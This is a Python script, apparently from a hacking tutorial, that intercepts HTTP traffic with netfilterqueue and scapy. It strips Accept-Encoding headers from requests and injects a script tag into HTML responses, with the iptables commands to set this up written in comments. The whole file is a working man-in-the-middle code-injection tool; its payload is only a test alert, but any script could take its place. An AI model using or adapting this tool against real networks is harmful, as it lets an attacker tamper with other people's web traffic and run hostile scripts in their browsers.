#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Must do when done:  iptables fllush

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Remove fields so scapy can recalc..
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


ack_list = []


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print('Port: ' + str(scapy_packet[scapy.TCP].sport))
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:  # leaving
            print('[+] Request')
            load = re.sub(
                'Accept-Encoding:.*?\\r\\n', "", load)
            # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            print(scapy_packet.show())
            load = load.replace(
                '</body>', '<script>alert("test");</script></body>')

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
